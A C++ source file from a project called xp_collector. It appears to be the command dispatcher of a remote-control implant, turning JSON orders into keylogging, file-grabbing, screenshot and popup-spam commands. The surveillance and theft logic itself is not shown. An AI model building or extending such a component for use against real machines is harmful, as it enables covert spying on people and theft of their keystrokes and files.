#include "Commands/CommandFactory.h"

#include "GetFileCommand.h"
#include "Commands/PopupCommand.h"
#include "Commands/KeyLogCommand.h"
using namespace xp_collector;

std::unique_ptr<BasicCommand> CommandFactory::create(const json& command)
{
	const auto& command_id = command["command_id"];
	const auto command_type = ct_from_string(command["command_type"]);
	switch (auto basic = std::make_unique<BasicCommand>(command_id, command_type); basic->get_command_type()) {
	case CommandType::Popup:
	case CommandType::PopupSpam:
		return std::make_unique<PopupCommand>(command_id, command_type, command["parameters"]["message"]);
	case CommandType::KeyLog:
		return std::make_unique<KeyLogCommand>(command_id, command_type, command["parameters"]["duration"]);
	case CommandType::GetFile:
		return std::make_unique<GetFileCommand>(command_id, command_type, command["parameters"]["path"]);

	// Commands with the BasicCommand structure go here, I.E. commands that receive no parameters
	case CommandType::Screenshot:
	default:
		return std::move(basic);
	}
}
